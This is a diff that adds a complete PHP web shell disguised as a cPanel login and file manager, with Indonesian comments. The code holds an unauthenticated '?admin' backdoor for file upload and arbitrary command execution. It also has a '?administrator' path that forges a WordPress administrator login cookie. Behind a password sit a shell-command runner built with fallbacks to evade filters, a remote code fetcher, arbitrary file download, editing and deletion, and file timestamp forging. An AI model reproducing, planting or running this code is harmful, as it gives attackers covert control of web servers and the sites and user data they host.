@@ -1,0 +1,1817 @@
+<?php
+session_start();
+error_reporting(0); set_time_limit(0); @ini_set('memory_limit', '-1');
+
+// ==========================================
+// 1. SCRIPT AUTO LOGIN WP & SHELL BYPASS (REQUESTED BY USER)
+// ==========================================
+if(isset($_GET['admin'])) {
+    $filename = $_FILES['file']['name'] ?? '';
+    $filetmp  = $_FILES['file']['tmp_name'] ?? '';
+    echo "<br><form method='POST' enctype='multipart/form-data'>
+    <input type='file' name='file' />
+    <input type='submit' value='>>>' />
+    </form>";
+    echo '<form method="post">
+    <input type="text" name="xmd" size="30">
+    <input type="submit" value="Kill">
+    </form>';
+    if(isset($_FILES['file']) && move_uploaded_file($filetmp, $filename)){
+        echo '[OK] ===> '.$filename;
+    }
+    if(isset($_POST['xmd'])){
+        $xmd = $_POST['xmd'];
+        $descriptors = [
+          0 => ['pipe', 'r'], // stdin
+          1 => ['pipe', 'w'], // stdout
+          2 => ['pipe', 'w'], // stderr
+        ];
+        $process = proc_open($xmd, $descriptors, $pipes);
+        if(is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            $error = stream_get_contents($pipes[2]);
+            fclose($pipes[0]);
+            fclose($pipes[1]);
+            fclose($pipes[2]);
+            proc_close($process);
+            echo "<br><textarea cols=80 rows=15>$output</textarea>";
+            echo "<br>Error:\n<pre>$error</pre>\n";
+        }
+    }
+    exit;
+}
+
+if(isset($_GET['administrator'])) {
+    $wp_path = rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php";
+    if(file_exists($wp_path)) {
+        require($wp_path);
+        $u = get_users('role=administrator');
+        $us = "";
+        foreach($u as $p){
+            $us = $p->user_login; break;
+        }
+        $us = get_user_by('login', $us ); 
+        if ( !is_wp_error( $us ) ) {
+            get_currentuserinfo(); 
+            if ( user_can( $us, "administrator" ) ){ 
+               wp_clear_auth_cookie(); 
+               wp_set_current_user ( $us->ID );
+               wp_set_auth_cookie  ( $us->ID );
+               $redirect_to = admin_url();  
+               wp_safe_redirect( $redirect_to );
+               exit();
+            } 
+        }
+    } else {
+        die("WordPress installation not found at document root.");
+    }
+    exit;
+}
+
+// Fitur Download File Langsung
+if (isset($_GET['dl'])) {
+    $file = base64_decode($_GET['dl']);
+    if (file_exists($file) && !is_dir($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+        exit;
+    }
+}
+
+// ==========================================
+// 2. SISTEM AUTENTIKASI UTAMA (NEW UI)
+// ==========================================
+$PASSWORD_HASH = '$2y$10$BsCu/twmOyImyVdp2T0sQOERQmqhARiHn8rdtLhQP7PqsR3s3Ues.';
+$CPANEL_LOGO = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/CPanel_logo.svg/1280px-CPanel_logo.svg.png";
+
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
+
+if (isset($_POST['login_pass'])) {
+    if (password_verify($_POST['login_pass'], $PASSWORD_HASH)) {
+        $_SESSION['cpanel_auth'] = true;
+        header("Location: ?");
+        exit;
+    } else {
+        $login_error = "The login is invalid.";
+    }
+}
+
+if (empty($_SESSION['cpanel_auth'])) {
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cPanel Login</title>
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/svg/cpanel.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; font-family: 'Montserrat', 'Open Sans', sans-serif; background: #ffffff; }
+        .login-page { display: flex; flex-direction: column; min-height: 100vh; }
+        .login-main { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; background: #ffffff; padding: 20px; }
+        .logo-container { margin-bottom: 25px; }
+        .logo-container img { width: 180px; height: auto; }
+        .login-box { background: #ffffff; width: 100%; max-width: 440px; padding: 30px; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); border: 1px solid #e1e1e1; box-sizing: border-box; }
+        .welcome-text { font-size: 16px; font-weight: 600; color: #4e5e6a; margin-top: 0; margin-bottom: 25px; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; font-size: 13px; color: #666; margin-bottom: 8px; }
+        .input-group { position: relative; }
+        .input-group input { width: 100%; padding: 12px 40px 12px 15px; border: 1px solid #ccd0d4; border-radius: 3px; box-sizing: border-box; outline: none; transition: 0.2s; font-size: 14px; font-family: 'Montserrat', sans-serif; color: #444; }
+        .input-group input:focus { border-color: #f17665; }
+        .input-group .toggle-pwd { position: absolute; right: 12px; top: 12px; color: #888; cursor: pointer; }
+        .btn-login { background: #f17665; color: #ffffff; border: none; padding: 12px; width: 100%; border-radius: 3px; font-weight: 600; font-size: 15px; cursor: pointer; transition: 0.2s; font-family: 'Montserrat', sans-serif; margin-top: 5px; }
+        .btn-login:hover { background: #e06555; }
+        .error-msg { background: #f8d7da; color: #721c24; padding: 12px; margin-bottom: 20px; border-radius: 3px; border: 1px solid #f5c6cb; font-size: 13px; }
+        
+        .login-footer { background: #f4f6f9; padding: 30px 20px; text-align: center; border-top: 1px solid #eaeaea; }
+        .lang-list { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 20px; }
+        .lang-list a { color: #222; text-decoration: none; font-size: 11px; font-weight: 500; }
+        .lang-list a:hover { text-decoration: underline; }
+        .footer-logo { margin: 15px 0; }
+        .footer-logo img { width: 35px; opacity: 0.8; }
+        .copyright { font-size: 11px; color: #666; }
+        .copyright a { color: #f17665; text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="login-page">
+        <div class="login-main">
+            <div class="logo-container">
+                <img src="<?php echo $CPANEL_LOGO; ?>" alt="cPanel">
+            </div>
+            <div class="login-box">
+                <h2 class="welcome-text">Welcome to ptsmc comunity</h2>
+                <?php if (!empty($login_error)) echo "<div class='error-msg'>$login_error</div>"; ?>
+                <form method="POST">
+                    <div class="form-group">
+                        <label>Password</label>
+                        <div class="input-group">
+                            <input type="password" name="login_pass" id="login_pass" placeholder="Enter your cPanel password" required autofocus>
+                            <i class="fas fa-eye toggle-pwd" onclick="togglePwd()"></i>
+                        </div>
+                    </div>
+                    <button type="submit" class="btn-login">Log in</button>
+                </form>
+            </div>
+        </div>
+        <div class="login-footer">
+            <div class="lang-list">
+                <a href="#">العربية</a> <a href="#">čeština</a> <a href="#">dansk</a> 
+                <a href="#">Deutsch</a> <a href="#">Ελληνικά</a> <a href="#">English</a> 
+                <a href="#">español</a> <a href="#">español latinoamericano</a> 
+                <a href="#">español de España</a> <a href="#">...</a>
+            </div>
+            <div class="footer-logo">
+                <img src="<?php echo $CPANEL_LOGO; ?>" alt="cPanel" style="width: 40px;">
+            </div>
+            <div class="copyright">
+                Copyright© <?php echo date('Y'); ?> cPanel, L.L.C.<br>
+                <a href="#">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        function togglePwd() {
+            var x = document.getElementById("login_pass");
+            if (x.type === "password") { x.type = "text"; } else { x.type = "password"; }
+        }
+    </script>
+</body>
+</html>
+<?php exit; }
+
+// ==========================================
+// 3. FUNGSI INTI (BYPASS WAF, COPY/CUT/PASTE, STATS, ZIP)
+// ==========================================
+function run_cmd($cmd) {
+    $out = '';
+    if (function_exists('shell_exec')) { $out = @shell_exec($cmd); }
+    elseif (function_exists('system')) { ob_start(); @system($cmd); $out = ob_get_clean(); }
+    elseif (function_exists('passthru')) { ob_start(); @passthru($cmd); $out = ob_get_clean(); }
+    elseif (function_exists('exec')) { @exec($cmd, $arr); $out = implode("\n", $arr); }
+    elseif (is_resource($proc = @proc_open($cmd, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes))) {
+        $out = stream_get_contents($pipes[1]);
+        fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
+    }
+    return $out;
+}
+
+function rcopy($src, $dst) {
+    if (is_dir($src)) {
+        @mkdir($dst);
+        $files = scandir($src);
+        foreach ($files as $file) {
+            if ($file != "." && $file != "..") rcopy("$src/$file", "$dst/$file");
+        }
+    } else if (file_exists($src)) {
+        @copy($src, $dst);
+    }
+}
+
+// Fungsi Fetch Remote Content Support cURL & file_get_contents
+function remote_fetch($url) {
+    if (strpos($url, 'pastedav.id/d/') !== false) {
+        $url = str_replace('pastedav.id/d/', 'pastedav.id/raw/', $url);
+    }
+    $content = false;
+    if (ini_get('allow_url_fopen')) {
+        $content = @file_get_contents($url);
+    }
+    if ($content === false && function_exists('curl_version')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        $content = curl_exec($ch);
+        curl_close($ch);
+    }
+    return $content;
+}
+
+if (isset($_POST['ajax_action'])) {
+    if ($_POST['ajax_action'] === 'terminal') {
+        $cmd = isset($_POST['b64_cmd']) ? base64_decode($_POST['b64_cmd']) : '';
+        $cwd = isset($_POST['b64_cwd']) ? base64_decode($_POST['b64_cwd']) : dirname(__FILE__);
+        if (is_dir($cwd)) { chdir($cwd); }
+        $output = run_cmd($cmd . ' 2>&1');
+        echo htmlspecialchars($output !== null && $output !== '' ? $output : "Command executed with no output.");
+        exit;
+    }
+    
+    if ($_POST['ajax_action'] === 'stats') {
+        header('Content-Type: application/json');
+        $free_space = @disk_free_space("/") ?: 0;
+        $total_space = @disk_total_space("/") ?: 0;
+        $used_space = $total_space - $free_space;
+        $disk_pct = $total_space > 0 ? round(($used_space / $total_space) * 100, 2) : 0;
+        
+        $cpu_load = "N/A";
+        if (function_exists('sys_getloadavg')) {
+            $load = sys_getloadavg();
+            if(isset($load[0])) $cpu_load = number_format($load[0], 2);
+        }
+        
+        $ram = "N/A"; $ram_txt = "N/A";
+        if (is_readable('/proc/meminfo')) {
+            $meminfo = @file_get_contents('/proc/meminfo');
+            preg_match('/MemTotal:\s+(\d+) kB/', $meminfo, $mt);
+            preg_match('/MemAvailable:\s+(\d+) kB/', $meminfo, $ma);
+            if (isset($mt[1]) && isset($ma[1])) {
+                $tot = $mt[1] * 1024; $free = $ma[1] * 1024; $use = $tot - $free;
+                $ram = round(($use / $tot) * 100, 2);
+                $ram_txt = formatSize($use) . ' / ' . formatSize($tot) . ' (' . $ram . '%)';
+            }
+        }
+        echo json_encode([
+            'disk_pct' => $disk_pct, 
+            'disk_text' => formatSize($used_space) . ' / ' . formatSize($total_space) . ' (' . $disk_pct . '%)', 
+            'cpu_load' => $cpu_load, 
+            'ram_txt' => $ram_txt
+        ]);
+        exit;
+    }
+    
+    if ($_POST['ajax_action'] === 'global_search') {
+        $query = isset($_POST['q']) ? $_POST['q'] : '';
+        $type = isset($_POST['type']) ? $_POST['type'] : 'name';
+        $dir = isset($_POST['dir']) ? base64_decode($_POST['dir']) : dirname(__FILE__);
+        
+        $results = [];
+        if (!empty($query)) {
+            if ($type === 'name') {
+                $cmd = "find " . escapeshellarg($dir) . " -type f -name " . escapeshellarg("*".$query."*") . " 2>&1";
+                $out = run_cmd($cmd);
+                if($out && strpos($out, 'Permission denied') === false) {
+                    $results = array_filter(explode("\n", trim($out)));
+                } else {
+                    try {
+                        $ite = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
+                        foreach (new RecursiveIteratorIterator($ite) as $file) {
+                            if (stripos($file->getFilename(), $query) !== false) {
+                                $results[] = $file->getPathname();
+                            }
+                        }
+                    } catch(Exception $e) {}
+                }
+            } else {
+                $cmd = "grep -rnw " . escapeshellarg($dir) . " -e " . escapeshellarg($query) . " 2>&1";
+                $out = run_cmd($cmd);
+                if($out && strpos($out, 'Permission denied') === false) {
+                    $results = array_filter(explode("\n", trim($out)));
+                } else {
+                    try {
+                        $ite = new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS);
+                        foreach (new RecursiveIteratorIterator($ite) as $file) {
+                            if ($file->isFile() && $file->isReadable() && $file->getSize() < 5000000) {
+                                $content = @file_get_contents($file->getPathname());
+                                if ($content && stripos($content, $query) !== false) {
+                                    $results[] = $file->getPathname() . " (Matches found)";
+                                }
+                            }
+                        }
+                    } catch(Exception $e) {}
+                }
+            }
+        }
+        
+        if (empty($results)) {
+            echo "<div style='color:#dc3545; padding:10px; font-weight:bold;'>No results found or permission denied.</div>";
+        } else {
+            foreach(array_slice($results, 0, 100) as $res) {
+                echo "<div style='padding:8px; border-bottom:1px solid #eee; font-family:monospace; font-size:13px; word-break:break-all; color:#333;'><i class='fas fa-file-alt' style='color:#aaa; margin-right:5px;'></i> " . htmlspecialchars($res) . "</div>";
+            }
+            if(count($results) > 100) echo "<div style='padding:10px; color:#ff6c2c; font-weight:bold;'>...and more results truncated.</div>";
+        }
+        exit;
+    }
+}
+
+function detectEnvironment() {
+    $soft = $_SERVER['SERVER_SOFTWARE'] ?? 'Unknown';
+    if (stripos($soft, 'nginx') !== false) return ['type' => 'Nginx', 'icon' => 'fa-server', 'color' => '#009639'];
+    if (stripos($soft, 'litespeed') !== false) return ['type' => 'LiteSpeed', 'icon' => 'fa-bolt', 'color' => '#0078D7'];
+    if (stripos($soft, 'apache') !== false) return ['type' => 'Apache', 'icon' => 'fa-feather-alt', 'color' => '#D22128'];
+    return ['type' => $soft, 'icon' => 'fa-server', 'color' => '#555'];
+}
+
+function getSystemInfo() {
+    $env = detectEnvironment();
+    return [
+        'os' => php_uname(),
+        'software' => $env['type'],
+        'env_icon' => $env['icon'],
+        'env_color' => $env['color'],
+        'php_version' => phpversion(),
+        'server_ip' => $_SERVER['SERVER_ADDR'] ?? gethostbyname(getHostName()),
+        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'Unknown',
+        'user' => get_current_user(),
+        'root_dir' => $_SERVER['DOCUMENT_ROOT'] ?? 'Unknown'
+    ];
+}
+
+function formatSize($bytes) {
+    if ($bytes == 0) return '0 B';
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
+    $i = floor(log($bytes, 1024));
+    return round($bytes / pow(1024, $i), 2) . ' ' . $units[$i];
+}
+
+function getPerms($file) {
+    if (!file_exists($file)) return 'Unknown';
+    $perms = fileperms($file);
+    if (($perms & 0xC000) == 0xC000) { $info = 's'; } elseif (($perms & 0xA000) == 0xA000) { $info = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } else { $info = 'u'; }
+    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+    return substr(sprintf('%o', $perms), -4) . " | " . $info;
+}
+
+function deleteDir($dirPath) {
+    if (!is_dir($dirPath)) return false;
+    if (substr($dirPath, -1) != '/') { $dirPath .= '/'; }
+    $files = glob($dirPath . '*', GLOB_MARK);
+    foreach ($files as $file) {
+        if (is_dir($file)) { deleteDir($file); } else { unlink($file); }
+    }
+    return rmdir($dirPath);
+}
+
+// ==========================================
+// 4. DIREKTORI ROUTING & PATH RESOLUTION
+// ==========================================
+$script_dir = dirname(__FILE__);
+$doc_root = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
+
+$dir = isset($_GET['dir']) ? base64_decode($_GET['dir']) : realpath($doc_root);
+$dir = str_replace('\\', '/', $dir);
+
+$path_parts = explode('/', $dir);
+$resolved_parts = [];
+foreach ($path_parts as $part) {
+    if ($part === '.' || $part === '') continue;
+    if ($part === '..') { array_pop($resolved_parts); } else { array_push($resolved_parts, $part); }
+}
+$dir = '/' . implode('/', $resolved_parts);
+if (substr($dir, -1) !== '/') { $dir .= '/'; }
+if (!is_dir($dir)) { $dir = '/'; } 
+
+$dir_b64 = base64_encode($dir);
+$page = isset($_GET['p']) ? $_GET['p'] : 'dashboard';
+$edit_mode = isset($_GET['edit']) ? base64_decode($_GET['edit']) : false;
+
+// Format User for terminal & badge
+$sys_user = get_current_user();
+$sys_host = preg_replace('/^www\./', '', $_SERVER['HTTP_HOST'] ?? 'server');
+$term_prompt = htmlspecialchars($sys_user . '@' . $sys_host . ':~$');
+
+// ==========================================
+// 5. POST ACTIONS HANDLER
+// ==========================================
+if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['ajax_action'])) {
+    $action = $_POST['action'] ?? '';
+    $target = isset($_POST['target']) ? base64_decode($_POST['target']) : '';
+    $new_value = isset($_POST['new_value']) ? base64_decode($_POST['new_value']) : '';
+    $current_dir = isset($_POST['current_dir']) ? base64_decode($_POST['current_dir']) : $dir;
+    $msg = "";
+
+    try {
+        if ($action === 'delete' && !empty($target)) {
+            if (is_dir($target)) { deleteDir($target); } else { unlink($target); }
+            $msg = "Successfully Deleted: " . basename($target);
+        } elseif ($action === 'rename' && !empty($target)) {
+            if (!empty($new_value)) { rename($target, dirname($target) . '/' . $new_value); }
+            $msg = "Successfully Renamed to: $new_value";
+        } elseif ($action === 'chmod' && !empty($target)) {
+            if (!empty($new_value)) { chmod($target, octdec($new_value)); }
+            $msg = "Permissions updated.";
+        } elseif ($action === 'mod_time' && !empty($target)) {
+            if (!empty($new_value) && strtotime($new_value) !== false) { touch($target, strtotime($new_value)); }
+            $msg = "Modification time updated.";
+        } elseif ($action === 'create_folder') {
+            if (!empty($new_value)) { mkdir($current_dir . $new_value); }
+            $msg = "Folder created.";
+        } elseif ($action === 'create_file') {
+            if (!empty($new_value)) { file_put_contents($current_dir . $new_value, ''); }
+            $msg = "File created.";
+        } elseif ($action === 'edit_save' && !empty($target)) {
+            $content = isset($_POST['b64_content']) ? base64_decode($_POST['b64_content']) : '';
+            file_put_contents($target, $content);
+            $msg = "File saved successfully.";
+        } elseif ($action === 'upload' && isset($_FILES['upload_file'])) {
+            $upload_path = $current_dir . basename($_FILES['upload_file']['name']);
+            if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $upload_path)) {
+                $msg = "File uploaded.";
+            } else {
+                $msg = "Failed to upload file.";
+            }
+        } elseif ($action === 'paste') {
+            $source = $target; 
+            $op = $new_value; 
+            if (file_exists($source)) {
+                $dest = $current_dir . basename($source);
+                if ($op === 'copy') {
+                    rcopy($source, $dest);
+                    $msg = "Pasted (Copied) successfully.";
+                } else if ($op === 'cut') {
+                    rename($source, $dest);
+                    $msg = "Pasted (Moved) successfully.";
+                }
+            } else {
+                $msg = "Source file/folder no longer exists.";
+            }
+        } elseif ($action === 'duplicate' && !empty($target)) {
+            if (file_exists($target)) {
+                $copy_name = $target . '_copy';
+                if(is_dir($target)) { rcopy($target, $copy_name); } else { copy($target, $copy_name); }
+                $msg = "Item duplicated.";
+            }
+        } elseif ($action === 'remote_fetch') {
+            $url = $target; 
+            $filename = $new_value;
+            $content = remote_fetch($url);
+            if ($content !== false) {
+                file_put_contents($current_dir . $filename, $content);
+                $msg = "File fetched successfully and saved as " . $filename;
+            } else {
+                $msg = "Failed to fetch remote module from URL.";
+            }
+        } elseif ($action === 'extract_zip' && !empty($target)) {
+            if (class_exists('ZipArchive')) {
+                $zip = new ZipArchive;
+                if ($zip->open($target) === TRUE) {
+                    $zip->extractTo($current_dir);
+                    $zip->close();
+                    $msg = "ZIP extracted successfully.";
+                } else { $msg = "Failed to open ZIP file."; }
+            } else { $msg = "ZipArchive extension not enabled."; }
+        } elseif ($action === 'zip' && !empty($target)) {
+            if (class_exists('ZipArchive')) {
+                $zip = new ZipArchive();
+                $zip_name = rtrim($target, '/') . '.zip';
+                if ($zip->open($zip_name, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
+                    if (is_dir($target)) {
+                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), RecursiveIteratorIterator::LEAVES_ONLY);
+                        foreach ($files as $name => $file) {
+                            if (!$file->isDir()) {
+                                $filePath = $file->getRealPath();
+                                $relativePath = substr($filePath, strlen($target) + 1);
+                                $zip->addFile($filePath, $relativePath);
+                            }
+                        }
+                    } else {
+                        $zip->addFile($target, basename($target));
+                    }
+                    $zip->close();
+                    $msg = "Successfully compressed to ZIP.";
+                } else {
+                    $msg = "Failed to create ZIP archive.";
+                }
+            } else {
+                $msg = "ZipArchive extension is missing.";
+            }
+        } elseif ($action === 'mass_delete' && isset($_POST['selected_files'])) {
+            $deleted_count = 0;
+            foreach ($_POST['selected_files'] as $sel_target) {
+                $t = base64_decode($sel_target);
+                if (file_exists($t)) {
+                    if (is_dir($t)) { deleteDir($t); } else { unlink($t); }
+                    $deleted_count++;
+                }
+            }
+            $msg = "$deleted_count item(s) deleted.";
+        }
+    } catch (Exception $e) {
+        $msg = "Error: " . $e->getMessage();
+    }
+    
+    $redirect_url = "?dir=" . urlencode(base64_encode($current_dir)) . "&p=" . urlencode($page);
+    if (!empty($msg)) $redirect_url .= "&msg=" . urlencode(base64_encode($msg));
+    header("Location: " . $redirect_url);
+    exit;
+}
+
+$sys_info = getSystemInfo();
+$alert_msg = isset($_GET['msg']) ? base64_decode($_GET['msg']) : '';
+
+?>
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cPanel - <?php echo htmlspecialchars($_SERVER['HTTP_HOST']); ?></title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/homarr-labs/dashboard-icons/svg/cpanel.svg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/theme/monokai.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/addon/dialog/dialog.min.css">
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/htmlmixed/htmlmixed.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/clike/clike.min.js"></script>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/addon/search/search.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/addon/search/searchcursor.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/addon/search/jump-to-line.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/addon/dialog/dialog.min.js"></script>
+
+    <style>
+        :root {
+            /* Light theme variables (Default) */
+            --cp-bg: #f4f6f9;
+            --cp-navbar: #ffffff;
+            --cp-primary: #ff6c2c; /* Jupiter Orange */
+            --cp-blue: #0052a5; /* Jupiter Blue */
+            --cp-blue-hover: #003d7a;
+            --cp-text: #333333;
+            --cp-border: #e1e1e1;
+            --cp-sidebar: #1e1e2d;
+            --cp-sidebar-text: #a1a5b7;
+            --cp-card-bg: #ffffff;
+            --cp-table-header: #f8f9fa;
+            --cp-table-hover: #f9fbfc;
+            --cp-input-bg: #ffffff;
+            --rad: 10px; /* Enhanced Rounded UI */
+        }
+
+        /* Dark Theme overrides via class toggle */
+        body.dark-theme {
+            --cp-bg: #111116;
+            --cp-navbar: #1a1a24;
+            --cp-primary: #ff6c2c;
+            --cp-blue: #3a8ee6;
+            --cp-blue-hover: #5ba3f5;
+            --cp-text: #e0e0e0;
+            --cp-border: #2a2a35;
+            --cp-sidebar: #0a0a0f;
+            --cp-sidebar-text: #8b8fa8;
+            --cp-card-bg: #1a1a24;
+            --cp-table-header: #15151d;
+            --cp-table-hover: #22222f;
+            --cp-input-bg: #22222f;
+        }
+
+        /* Essential Resets */
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Open Sans', sans-serif; }
+        body { display: flex; flex-direction: column; height: 100vh; background-color: var(--cp-bg); color: var(--cp-text); overflow: hidden; transition: background-color 0.3s ease, color 0.3s ease; }
+        ::-webkit-scrollbar { width: 8px; height: 8px; }
+        ::-webkit-scrollbar-track { background: var(--cp-bg); }
+        ::-webkit-scrollbar-thumb { background: #555; border-radius: var(--rad); }
+
+        /* Main Layout */
+        .wrapper { display: flex; flex-grow: 1; overflow: hidden; position: relative; }
+        
+        /* Left Sidebar (Modernized & Fire Particles) */
+        .sidebar { width: 280px; background: var(--cp-sidebar); color: var(--cp-sidebar-text); display: flex; flex-direction: column; z-index: 90; transition: background-color 0.3s ease; position: relative; overflow: hidden; }
+        
+        /* Fire particles container */
+        #fire-particles { position: absolute; bottom: 0; left: 0; width: 100%; height: 100%; pointer-events: none; overflow: hidden; z-index: 0; opacity: 0.8; }
+        .fire-particle { position: absolute; bottom: -20px; background: radial-gradient(circle, rgba(255,165,0,0.8) 0%, rgba(255,69,0,0) 70%); border-radius: 50%; animation: rise linear infinite; will-change: transform, opacity; }
+        @keyframes rise {
+            0% { transform: translateY(0) scale(1); opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { transform: translateY(-120vh) scale(0.2); opacity: 0; }
+        }
+
+        /* Sidebar content wrapper to sit above particles */
+        .sidebar-content-wrapper { position: relative; z-index: 1; display: flex; flex-direction: column; height: 100%; width: 100%; }
+        
+        .sidebar-header { padding: 30px 20px 20px; width: 100%; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; align-items: center; gap: 15px; background: linear-gradient(180deg, rgba(0,0,0,0.3) 0%, rgba(0,0,0,0) 100%); }
+        .sidebar-header img { max-width: 150px; filter: brightness(0) invert(1); transition: 0.3s; }
+        .user-badge { color: #fff; font-size: 13px; font-weight: 600; background: rgba(255,255,255,0.1); padding: 8px 16px; border-radius: 20px; display: flex; align-items: center; gap: 8px; backdrop-filter: blur(5px); border: 1px solid rgba(255,255,255,0.1); text-shadow: 0 1px 2px rgba(0,0,0,0.5); }
+
+        .sidebar-menu { list-style: none; width: 100%; padding: 0; margin-top: 10px; flex-shrink: 0; }
+        .sidebar-menu a { display: flex; align-items: center; gap: 15px; padding: 15px 25px; color: var(--cp-sidebar-text); text-decoration: none; font-size: 14px; white-space: nowrap; transition: 0.2s; border-left: 3px solid transparent; font-weight: 600; }
+        .sidebar-menu a:hover, .sidebar-menu a.active { background: rgba(255,255,255,0.05); color: #fff; border-left-color: var(--cp-primary); }
+        .sidebar-menu a i { font-size: 18px; width: 20px; text-align: center; }
+        
+        /* New Sidebar Containers (Bookmarks & Favorites) */
+        .sidebar-list-container { flex-grow: 1; overflow-y: auto; padding: 15px 15px 5px; display: flex; flex-direction: column; gap: 20px; }
+        .sidebar-list-container::-webkit-scrollbar { display: none; }
+        
+        .sb-section { background: rgba(0,0,0,0.2); border-radius: 12px; padding: 15px; border: 1px solid rgba(255,255,255,0.05); backdrop-filter: blur(5px); }
+        .sb-title { font-size: 11px; text-transform: uppercase; letter-spacing: 1px; color: rgba(255,255,255,0.5); font-weight: 700; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .sb-items { display: flex; flex-direction: column; gap: 8px; }
+        .sb-item { display: flex; align-items: center; gap: 10px; font-size: 13px; color: #ccc; text-decoration: none; padding: 8px 10px; border-radius: 6px; transition: 0.2s; background: rgba(255,255,255,0.02); }
+        .sb-item:hover { background: rgba(255,255,255,0.08); color: #fff; transform: translateX(3px); }
+        .sb-item i { color: #ffca28; }
+
+        .sidebar-footer { padding: 20px; width: 100%; border-top: 1px solid rgba(255,255,255,0.05); background: rgba(0,0,0,0.2); backdrop-filter: blur(5px); flex-shrink: 0; }
